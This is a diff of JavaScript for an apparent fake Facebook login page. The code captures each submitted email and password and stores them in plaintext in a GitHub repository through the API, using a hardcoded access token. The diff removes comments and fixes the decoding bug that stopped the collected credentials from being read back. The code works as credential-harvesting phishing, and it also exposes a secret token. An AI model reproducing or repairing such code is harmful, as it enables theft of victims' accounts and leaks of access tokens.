@@ -3,7 +3,6 @@ const GITHUB_TOKEN = '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';
 const REPO_OWNER = 'ASADALSNA';
 const REPO_NAME = 'facebook-login';
 
-// دالة لحل مشكلة Unicode مع btoa
 function utf8ToBase64(str) {
     const bytes = new TextEncoder().encode(str);
     let binary = '';
@@ -22,7 +21,6 @@ function base64ToUtf8(base64) {
 
 document.getElementById('loginForm').addEventListener('submit', async function(e) {
     e.preventDefault();
-    
     const email = document.getElementById('email').value;
     const password = document.getElementById('password').value;
     const message = document.getElementById('message');
@@ -36,30 +34,21 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
     message.innerHTML = '⏳ جاري الحفظ في GitHub...';
     
     try {
-        // قراءة المستخدمين الحاليين
         let currentUsers = await fetchUsers();
-        
-        // إضافة المستخدم الجديد
         const newUser = {
             id: Date.now(),
             email: email,
             password: password,
-            date: new Date().toLocaleString('ar')  // عربي OK دلوقتي!
+            date: new Date().toLocaleString('ar')
         };
         currentUsers.push(newUser);
-        
-        // حفظ
         await saveUsers(currentUsers);
         
         message.innerHTML = `✅ تم الحفظ في GitHub! (${currentUsers.length} مستخدم)`;
         message.className = 'success';
-        
-        // عرض
         showUsers();
         document.getElementById('loginForm').reset();
-        
     } catch (error) {
-        console.error('خطأ كامل:', error);
         message.innerHTML = `❌ خطأ: ${error.message}`;
         message.className = 'error';
     }
@@ -72,20 +61,14 @@ async function fetchUsers() {
             headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
         });
         
-        if (response.status === 404) {
-            return [];
-        }
-        
-        if (!response.ok) {
-            throw new Error(`API Error: ${response.status}`);
-        }
+        if (response.status === 404) return [];
+        if (!response.ok) throw new Error(`API Error: ${response.status}`);
         
         const file = await response.json();
-        if (!file.content) {
-            return [];
-        }
+        if (!file.content) return [];
         
-        const decoded = utf8ToBase64(file.content);  // استخدم الدالة الجديدة
+        // ✅ إصلاح هنا!
+        const decoded = base64ToUtf8(file.content);
         return JSON.parse(decoded);
     } catch (error) {
         console.error('خطأ في القراءة:', error);
@@ -105,12 +88,10 @@ async function saveUsers(users) {
             const file = await response.json();
             sha = file.sha;
         }
-    } catch (e) {
-        // الملف مش موجود
-    }
-    
+    } catch (e) {}
+
     const jsonStr = JSON.stringify(users, null, 2);
-    const content = utf8ToBase64(jsonStr);  // استخدم الدالة الجديدة للترميز
+    const content = utf8ToBase64(jsonStr);
     
     const response = await fetch(url, {
         method: 'PUT',
@@ -146,6 +127,4 @@ async function showUsers() {
     message.innerHTML += display;
 }
 
-// تحميل عند البداية
 showUsers();
-
